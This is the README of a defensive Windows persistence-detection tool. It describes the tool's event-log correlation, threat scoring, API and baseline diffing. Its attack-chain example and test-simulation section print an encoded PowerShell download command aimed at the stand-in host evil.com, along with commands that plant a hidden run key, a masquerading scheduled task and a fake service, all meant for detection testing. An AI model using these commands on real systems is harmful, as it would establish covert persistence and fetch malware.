# Persistence Hunter

Windows persistence detection with attack chain reconstruction. Enumerates registry run keys, scheduled tasks, and services — then correlates each finding with Sysmon and Windows event log telemetry to show you how the persistence got there, not just that it exists.

Most tools give you a list. This gives you a chain.

---

## The problem it solves

Persistence is easy to find. Autoruns has done that for years. The harder question is whether a given persistence entry was dropped by a legitimate installer, a user action, or something that shouldn't be there at all. That distinction usually lives in the process tree — which process wrote the registry key, what spawned it, what spawned that.

Persistence Hunter answers that question by correlating each entry against Sysmon event 1, 12, and 13 records, Windows 4688 process creation events, 4698 task creation events, and 7045 service install events. The result is an attack chain per finding. Where the chain is clean, the finding is probably noise. Where the chain looks like `explorer.exe -> cmd.exe -> reg.exe`, you have something worth looking at.

It also decodes PowerShell `-enc` payloads inline, scores each finding on a 0-100 composite scale, tags MITRE techniques, and diffs against a baseline snapshot so repeat scans only surface what's new.

---

## What it covers

**Persistence mechanisms**
- Registry run keys across HKCU and HKLM, including RunOnce and common persistence subkeys
- Scheduled tasks — full enumeration with command parsing and PS decode
- Windows services — all entries with binary path extraction and Authenticode verification

**Event correlation**
- Sysmon event IDs 1 (process create), 12/13 (registry write), 11 (file create)
- Security event 4688 (process creation with command line)
- Security event 4698 (scheduled task created)
- System event 7045 (service installed)

**Analysis**
- PS `-enc` decode — UTF-16 LE, inline in output and in the UI
- Composite threat scoring with per-factor breakdown
- MITRE technique tagging — T1059, T1112, T1543, T1053, T1027 and variants
- LOLBin detection, masquerading detection, suspicious path flagging
- APT TTP pattern matching — APT29, APT32, Lazarus, Kimsuky signatures

**Binary verification**
- SHA256 per service binary
- Authenticode status via PowerShell Get-AuthenticodeSignature
- Signer and issuer extraction
- VirusTotal URL by hash — no API key needed
- Ghost service detection when the binary is missing from disk

**Baseline and diff**
- Snapshot the current state as a baseline
- Subsequent scans only surface entries not present at snapshot time
- Useful for distinguishing pre-existing noise from new activity

---

## Architecture

```
collector/
    base_collector.py        shared DB, event ingestion, chain building, baseline methods
    registry_collector.py    registry run key scanner
    task_collector.py        scheduled task scanner
    service_collector.py     service scanner

api/
    main.py                  FastAPI app
    scan_worker.py           background scan pipeline
    routes/
        alerts.py
        baseline.py
        chains.py
        entries.py
        scan.py
        scores.py
        search.py
        signatures.py
        stats.py
        summary.py

frontend/
    src/
        pages/
            Dashboard.jsx    telemetry overview, charts, recent alerts
            Alerts.jsx       alert feed with attack chain visualizer
            EntryDetail.jsx  per-entry tabs: Summary, Attack Chain, Intel, Details
            Entries.jsx      full entry table with filters
            Baseline.jsx     snapshot management and diff view
            Search.jsx       free-text search across entries and process events
        components/
            features/
                EnrichmentPanel.jsx   signature data and PS decode panel
                IntelPanel.jsx        risk indicators and threat score
                ProcessTree.jsx       attack chain visualizer
                ScanButton.jsx        scan trigger with live progress bar
                Threatscore.jsx       threat score widget with breakdown

ps_decode.py           PS -enc decoder
scan_summary.py        CLI cross-collector summary
check_signatures.py    CLI binary signature checker
threat_scorer.py       scoring engine
fix_db.py              creates baseline tables in reghunt.db
reghunt.db             SQLite database, auto-created on first run
```

---

## Requirements

- Windows 10/11 or Server 2016+
- Python 3.11+
- Node.js 18+ for the frontend
- Sysmon installed and running — chains are significantly richer with it
- Security audit policy: process creation auditing (4688) with command line enabled
- Admin rights for service enumeration and some event log access

Python packages: `fastapi uvicorn[standard] python-multipart`

Frontend packages: `react vite @tanstack/react-query axios react-router-dom framer-motion`

---

## Setup

Initialize the database:
```
python fix_db.py
```

Take a baseline on a known-clean system before any attack simulation:
```
python collector/registry_collector.py --scan --sysmon --events --hours 72 --baseline
python collector/task_collector.py --scan --sysmon --events --hours 72 --baseline
python collector/service_collector.py --scan --sysmon --events --hours 72 --baseline
```

Start the API:
```
python -m uvicorn api.main:app --host 0.0.0.0 --port 8000 --reload
```

Start the frontend:
```
cd frontend
npm install
npm run dev
```

---

## Daily workflow

```
python collector/registry_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python collector/task_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python collector/service_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python scan_summary.py --chains
```

`--diff` means only entries absent from the last baseline appear in output. Without it you get everything, which is mostly noise after the first run.

---

## CLI flags

| Flag | Description |
|---|---|
| `--scan` | Enumerate current persistence entries |
| `--sysmon` | Collect Sysmon events for chain correlation |
| `--events` | Collect Security and System event logs |
| `--hours N` | Event lookback window in hours, default 24 |
| `--baseline` | Snapshot current entries as the active baseline |
| `--diff` | Output only entries not present in the last baseline |
| `--chain-all` | Build attack chains for all High and Critical entries |
| `--json` | Export results to JSON |
| `--mark-safe NAME` | Add a named entry to the baseline to suppress it |

Signature check:
```
python check_signatures.py --all --exe-only --unsigned-only
```

| Flag | Description |
|---|---|
| `--all` | Include all services, not just High and Critical |
| `--exe-only` | Skip drivers and COM handlers with no parseable exe path |
| `--unsigned-only` | Only show unsigned, missing, or tampered binaries |
| `--json` | Write results to signature_results.json |

---

## API

| Endpoint | Method | Description |
|---|---|---|
| `/api/health` | GET | DB connectivity check |
| `/api/stats` | GET | Aggregated counts across all types |
| `/api/summary` | GET | New High/Critical entries since baseline |
| `/api/summary/stats` | GET | Quick counts for dashboard cards |
| `/api/alerts` | GET | Full alert feed |
| `/api/entries` | GET | All entries with type and severity filters |
| `/api/entries/{type}/{id}` | GET | Single entry |
| `/api/chains/{type}/{id}` | GET | Attack chain for one entry |
| `/api/scores` | GET | All threat scores |
| `/api/scores/{type}/{id}` | GET | Score and breakdown for one entry |
| `/api/scores/run` | POST | Run scorer across all entries |
| `/api/scan` | POST | Trigger full background scan |
| `/api/scan/status` | GET | Poll scan job progress |
| `/api/baseline` | GET | List baselines |
| `/api/baseline` | POST | Create snapshot |
| `/api/baseline/diff` | GET | New entries since last baseline |
| `/api/baseline/{id}` | DELETE | Remove a baseline |
| `/api/signatures` | GET | Cached signature results |
| `/api/signatures/run` | POST | Trigger background signature scan |
| `/api/signatures/iocs` | GET | Unsigned and suspicious binaries only |
| `/api/search` | GET | Search entries and process events |

---

## Threat scoring

Entries are scored 0–100. The score is a composite of weighted risk signals, not a single indicator.

| Score | Label | Meaning |
|---|---|---|
| 80–100 | Critical | High confidence. Investigate immediately. |
| 60–79 | High | Suspicious. Likely malicious or high-risk. |
| 35–59 | Medium | Indicators present. Review recommended. |
| 0–34 | Low | Informational. Probably not worth your time. |

Signals that contribute to score: encoded PowerShell payload, execution from temp or user-writable directories, LOLBin abuse, process name masquerading, malicious parent node in chain, chain depth, APT TTP matches, unsigned or missing binary.

The score is what the UI uses for severity classification. The collector's static severity field is a fallback when no score exists.

---

## Attack chain example

```
WindowsUpdater [CRITICAL, score 100]
Value: powershell.exe -nop -w hidden -enc JABjAD0...
Decoded: $c=New-Object System.Net.WebClient;$c.DownloadFile('http://evil.com/malware.exe','C:\malware\payload.exe')

Chain:
  explorer.exe      [stub]
    cmd.exe         [sysmon]        T1059.003
      reg.exe       [sysmon_exact]  T1112, T1027, T1562.001
        -> wrote HKCU\Run -> WindowsUpdater

Anomalies: malicious_writer, lolbin_chain, suspicious_path
```

Node source labels: `live` means process is currently running, `sysmon` means matched via Sysmon event, `sysmon_exact` means the event directly references this persistence entry, `stub` means a synthetic parent inserted to complete the chain.

---

## Test simulation

On an isolated test machine:

```
# Baseline first
python fix_db.py
python collector/registry_collector.py --scan --sysmon --events --hours 72 --baseline
python collector/task_collector.py --scan --sysmon --events --hours 72 --baseline
python collector/service_collector.py --scan --sysmon --events --hours 72 --baseline

# Inject
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdater" /t REG_SZ /d "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAG0AYQBsAHcAYQByAGUALgBlAHgAZQAnACwAJwBDADoAXABtAGEAbAB3AGEAcgBlAFwAcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=" /f
schtasks /create /tn "Microsoft\Windows\Maintenance\UpdateCheck" /tr "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=" /sc daily /st 00:00 /f
cmd /c "sc create EvilSvc binpath= C:\Windows\Temp\evil_payload.exe start= auto"

# Detect
python collector/registry_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python collector/task_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python collector/service_collector.py --scan --sysmon --events --hours 1 --diff --chain-all
python scan_summary.py --chains --json

# Clean up
reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdater" /f
schtasks /delete /tn "Microsoft\Windows\Maintenance\UpdateCheck" /f
cmd /c "sc delete EvilSvc"
```

Note: `sc create` must be run via `cmd /c` — PowerShell aliases `sc` to `Set-Content`.

Expected: three Critical findings, decoded PS payload visible in summary, full attack chains for each entry.

---

## Limitations

The collectors are tightly coupled to Windows event log structure. Running this on anything else is not supported.

Service enumeration and certain event log queries require admin rights. Running without elevation will produce incomplete results without a clear error — some queries will silently return nothing.

There is no authentication on the API. Do not expose port 8000 to a network without a reverse proxy in front of it.

Signature checking runs a PowerShell subprocess per binary. On a system with several hundred services this takes a few minutes. It is not designed for real-time use.

The baseline diff only compares by hash ID, not by entry content. If a malicious entry is modified in place after a baseline is taken, it may not surface as new.

This runs locally on a single machine. There is no agent architecture.